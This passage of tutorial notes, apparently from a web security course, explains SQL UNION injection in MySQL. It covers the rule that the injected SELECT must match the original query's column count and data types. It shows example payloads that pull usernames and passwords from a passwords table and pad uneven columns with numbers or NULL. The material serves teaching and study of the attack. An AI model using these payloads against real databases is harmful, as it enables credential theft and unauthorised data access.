injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL `Union` clause to do `SQL Union Injection`.

```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

>. The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases.


requirements:
>The data types of the selected columns on all positions should be the same.

>A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.


## Un-even Columns

We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that

Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
